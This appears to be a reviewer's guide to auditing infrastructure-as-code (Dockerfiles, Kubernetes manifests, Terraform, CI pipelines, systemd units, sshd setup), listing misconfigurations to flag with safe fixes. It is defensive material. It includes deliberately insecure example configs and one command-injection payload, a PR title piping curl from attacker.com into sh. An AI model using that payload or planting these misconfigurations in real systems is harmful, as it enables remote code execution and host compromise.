# iac-security-reviewer

Read this when reviewing Dockerfile, Kubernetes manifests, Terraform configs, GitHub Actions workflows, or other infrastructure-as-code files.

## Goal

Find misconfigurations in infrastructure definitions that would create security vulnerabilities in deployed environments: privilege escalation paths, exposed sensitive ports, public storage, overly permissive IAM, and secrets in pipeline configs.

## Part 1: Docker security

### Dockerfile review

**Running as root (high):**
```dockerfile
# Flag: no USER directive, or USER root
FROM ubuntu:20.04
RUN apt-get install -y myapp
# No USER instruction — runs as root by default
CMD ["./myapp"]

# Safe
RUN groupadd -r appgroup && useradd -r -g appgroup appuser
USER appuser
```

**Privileged or capability-escalated containers:**
```yaml
# docker-compose.yml — flag these
services:
  app:
    privileged: true                    # full host access
    cap_add:
      - SYS_PTRACE
      - SYS_ADMIN
      - NET_ADMIN
    security_opt:
      - seccomp:unconfined
      - apparmor:unconfined
      - no-new-privileges:false
```

**Hardcoded secrets in Dockerfile:**
```dockerfile
# Flag: secrets in ENV or ARG
ENV DB_PASSWORD=supersecret123
ARG API_KEY=abc123xyz              # visible in image layers even if unset later
RUN echo $DB_PASSWORD > /etc/dbconf

# Safe: use Docker secrets or runtime env injection
```

**Image hygiene:**
```dockerfile
# Flag: using latest tag — unpinned, non-reproducible builds
FROM ubuntu:latest
FROM python:latest

# Recommended: pinned digest
FROM python:3.12.3-slim@sha256:abc123...

# Flag: no .dockerignore — secrets files may be copied into image
COPY . .       # copies .env, .git, private keys if no .dockerignore
```

**Port exposure:**
```dockerfile
# Flag: exposing administrative ports
EXPOSE 22      # SSH
EXPOSE 3306    # MySQL
EXPOSE 5432    # PostgreSQL
EXPOSE 27017   # MongoDB
EXPOSE 6379    # Redis
```

**Package installation without version pinning:**
```dockerfile
# Flag: latest packages installed — may introduce vulnerable versions
RUN pip install flask requests     # no version constraints
```

## Part 2: Kubernetes security

### Pod security

```yaml
# Flag: privileged container
spec:
  containers:
  - name: app
    securityContext:
      privileged: true              # host kernel access
      allowPrivilegeEscalation: true
      runAsUser: 0                  # root
      runAsNonRoot: false
      readOnlyRootFilesystem: false
      capabilities:
        add:
          - SYS_ADMIN
          - NET_ADMIN

# Safe securityContext
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop:
      - ALL
```

### RBAC misconfigurations

```yaml
# Flag: overly permissive ClusterRole
rules:
- apiGroups: ["*"]
  resources: ["*"]        # all resources
  verbs: ["*"]            # all operations — essentially cluster admin

# Flag: wildcard verbs
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["*"]            # should be ["get", "list"] at most

# Flag: binding to cluster-admin
roleRef:
  kind: ClusterRole
  name: cluster-admin     # full cluster access for any service account binding
```

### Secrets management in K8s

```yaml
# Flag: secrets hardcoded in env vars (base64 is not encryption)
env:
- name: DB_PASSWORD
  value: "plaintext-password"

# Flag: Secret referenced but also hardcoded elsewhere
# Also: Secrets mounted as env vars are visible in pod spec and logs

# Better: use Vault, AWS Secrets Manager, or K8s sealed-secrets
```

### Network policies

```yaml
# Flag: no NetworkPolicy defined for the namespace
# Without NetworkPolicy, all pods can communicate with all other pods

# Flag: NetworkPolicy allows all ingress/egress
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  ingress:
  - {}                    # allow all — same as no policy
```

### Service exposure

```yaml
# Flag: sensitive services exposed as LoadBalancer or NodePort
kind: Service
spec:
  type: LoadBalancer      # exposed to internet
  # For: database service, admin dashboard, internal APIs
```

### Host path mounts

```yaml
# Flag: mounting host filesystem paths
volumes:
- name: host-root
  hostPath:
    path: /              # entire host root filesystem
- name: docker-socket
  hostPath:
    path: /var/run/docker.sock   # Docker socket = container escape
```

## Part 3: Terraform security

### AWS IAM

```hcl
# Flag: wildcard permissions
resource "aws_iam_policy" "too_permissive" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = "*"              # all actions
      Resource = "*"              # all resources
    }]
  })
}

# Flag: public-facing IAM role with assume-role from *
assume_role_policy = jsonencode({
  Statement = [{
    Action    = "sts:AssumeRole"
    Principal = { AWS = "*" }    # any AWS account
    Effect    = "Allow"
  }]
})
```

### S3 buckets

```hcl
# Flag: public bucket
resource "aws_s3_bucket_public_access_block" "example" {
  block_public_acls       = false    # should be true
  block_public_policy     = false    # should be true
  ignore_public_acls      = false    # should be true
  restrict_public_buckets = false    # should be true
}

# Flag: server-side encryption not enabled
# Missing: aws_s3_bucket_server_side_encryption_configuration

# Flag: logging not enabled for buckets storing sensitive data
# Missing: aws_s3_bucket_logging
```

### Security groups

```hcl
# Flag: 0.0.0.0/0 ingress on sensitive ports
resource "aws_security_group_rule" "bad" {
  type        = "ingress"
  from_port   = 22      # or 3306, 5432, 27017, 6379
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]   # open to internet
}
```

### Encryption

```hcl
# Flag: RDS without encryption at rest
resource "aws_db_instance" "example" {
  storage_encrypted = false   # should be true
}

# Flag: EBS volumes without encryption
resource "aws_ebs_volume" "example" {
  encrypted = false   # should be true
}

# Flag: Secrets in terraform.tfvars (committed to repo)
db_password = "actualpassword123"
```

## Part 4: CI/CD pipeline security (GitHub Actions, GitLab CI, Jenkins)

### GitHub Actions

```yaml
# Flag: overly permissive token permissions
permissions:
  contents: write
  id-token: write
  # Better: define minimum required permissions per job

# Flag: dangerous expression injection
- name: Run tests
  run: echo "${{ github.event.pull_request.title }}"  # PR title in shell command — injection
  # Attacker PR title: "; curl attacker.com | sh #"

# Flag: third-party action with no pinned version
uses: some-org/some-action@main     # mutable ref — supply chain risk
uses: some-org/some-action@v2       # tag can be moved — supply chain risk
# Safe:
uses: some-org/some-action@abc123def456   # pinned to commit SHA

# Flag: secrets in run step output
- run: echo "API_KEY=${{ secrets.API_KEY }}"  # secrets in log output

# Flag: self-hosted runner used for public repo PRs
# Untrusted code can run on self-hosted runners from forked PRs
```

### GitLab CI

```yaml
# Flag: variables with hardcoded secrets
variables:
  API_KEY: "hardcoded-value"    # visible to all pipeline users

# Flag: artifacts containing sensitive files
artifacts:
  paths:
    - .env
    - config/production.yml
```

## Part 5: systemd unit hardening gaps

### ProtectSystem=strict without ReadWritePaths (high)

`ProtectSystem=strict` makes the entire filesystem read-only (except `/dev` and `/proc`). If the service writes to any directory at runtime — binary updates, Unix socket files, state files, temp files — and those paths are not listed under `ReadWritePaths=`, `RuntimeDirectory=`, `StateDirectory=`, or `CacheDirectory=`, the service will fail with read-only filesystem errors. The hardening intent is present but the service is broken.

```ini
# Flag: strict protection without write exceptions for required runtime paths
[Service]
ProtectSystem=strict
# MISSING: ReadWritePaths=/opt/myapp /var/run/myapp
# MISSING: RuntimeDirectory=myapp      (auto-creates /run/myapp with write access)
# MISSING: StateDirectory=myapp        (auto-creates /var/lib/myapp with write access)

# The service writes to /opt/myapp/binary (recovery/update writes) and
# /var/run/myapp/agent.sock — both fail under ProtectSystem=strict without exceptions

# Correct: declare every runtime write path
[Service]
ProtectSystem=strict
ReadWritePaths=/opt/myapp
RuntimeDirectory=myapp          # creates /run/myapp owned by the service user
StateDirectory=myapp            # creates /var/lib/myapp for persistent state
```

Check: for every unit with `ProtectSystem=strict` or `ProtectSystem=full`, enumerate all directories the service writes to at runtime by reviewing the service binary's open/create/connect calls and any recovery or self-update code paths. Verify each write destination has a corresponding `ReadWritePaths=`, `RuntimeDirectory=`, `StateDirectory=`, or `CacheDirectory=` entry. A unit that has `ProtectSystem=strict` but is missing write exceptions for known runtime paths is a finding — hardening that silently breaks core functionality is not effective hardening.

### Missing ProtectSystem / ProtectHome for persistent services

Conversely, flag long-running services with no filesystem namespace isolation at all:

```ini
# Flag: no ProtectSystem, ProtectHome, or PrivateTmp — service can write anywhere
[Service]
ExecStart=/usr/bin/myservice
# No ProtectSystem, no ProtectHome, no PrivateTmp, no ReadOnlyPaths
```

For any daemon that does not need to write to system paths, the minimum hardening baseline is `ProtectSystem=full`, `ProtectHome=true`, and `PrivateTmp=true`.

## Part 6: SSH server setup race and missing AllowUsers

### sshd started before access restrictions are configured (medium)

When a setup script installs and starts `sshd` before writing the `AllowUsers` directive or `ForceCommand` block to `sshd_config`, there is a window where the daemon is running and reachable with no user restrictions. Any account that sshd would normally accept can log in interactively during that window.

```powershell
# Flag: starts sshd and opens firewall BEFORE adding access restrictions
Start-Service sshd                                          # sshd running, no restrictions yet
New-NetFirewallRule -DisplayName "SSH" -LocalPort 22 ...   # port 22 now reachable
Add-Content $sshdConfig "Match User LogReader`nForceCommand ..."  # restrictions added last

# Correct: configure sshd_config BEFORE starting the service
Add-Content $sshdConfig "AllowUsers LogReader`nMatch User LogReader`nForceCommand ..."
Restart-Service sshd                                        # or start fresh after config is written
New-NetFirewallRule -DisplayName "SSH" -LocalPort 22 ...
```

```bash
# Same pattern in shell scripts — flag:
systemctl start sshd
ufw allow 22
echo "Match User collector" >> /etc/ssh/sshd_config
echo "ForceCommand /opt/collector/run.sh" >> /etc/ssh/sshd_config
systemctl reload sshd   # restrictions applied too late

# Correct:
cat >> /etc/ssh/sshd_config << 'EOF'
AllowUsers collector
Match User collector
    ForceCommand /opt/collector/run.sh
EOF
systemctl start sshd
ufw allow 22
```

### No AllowUsers directive limiting SSH login (medium)

Flag any `sshd_config` or script that configures `sshd` without a global `AllowUsers` (or `AllowGroups`) directive, even when a `Match User ... ForceCommand` block is present. `ForceCommand` restricts what the matched user can do after login, but does not prevent other accounts from logging in interactively.

```ini
# Flag: ForceCommand present but no AllowUsers — other accounts can still log in
Match User collector
    ForceCommand /opt/collector/run.sh
    X11Forwarding no
    AllowTcpForwarding no
# Missing: AllowUsers collector   (at global scope, before any Match block)

# Correct: restrict who can authenticate before restricting what they can do
AllowUsers collector
Match User collector
    ForceCommand /opt/collector/run.sh
    X11Forwarding no
    AllowTcpForwarding no
```

Check: for every script that calls `Start-Service sshd`, `systemctl start sshd`, `systemctl enable sshd`, or modifies `sshd_config`, verify that `AllowUsers` or `AllowGroups` appears in the config file and that the service is not started or made network-reachable until after that directive is written and the daemon has reloaded/restarted with the updated config.

## Output format

```json
{
  "file": "k8s/deployment.yaml",
  "line": 34,
  "category": "iac_privilege_escalation",
  "title": "Container running as root with privilege escalation allowed",
  "description": "The app container runs as root (runAsUser: 0) with allowPrivilegeEscalation: true. A container escape or application compromise grants root access to the underlying node.",
  "remediation": "Set runAsNonRoot: true, runAsUser: 1000, allowPrivilegeEscalation: false, and capabilities.drop: [ALL] in the container securityContext.",
  "cwe": "CWE-250",
  "severity": "high"
}
```
